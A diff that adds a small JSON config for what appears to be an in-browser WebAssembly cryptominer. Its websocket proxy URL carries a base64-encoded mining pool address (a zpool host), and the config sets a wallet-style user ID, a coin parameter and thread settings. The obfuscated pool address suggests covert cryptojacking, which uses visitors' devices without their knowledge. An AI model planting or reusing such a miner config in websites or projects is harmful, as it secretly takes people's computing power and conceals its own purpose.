@@ -1,0 +1,5 @@
+{
+  "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
+  "config": { "threads": 2, "log": true },
+  "options": { "user": "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65", "password": "c=RVN", "argent": "web-wasm/1.0" }
+}
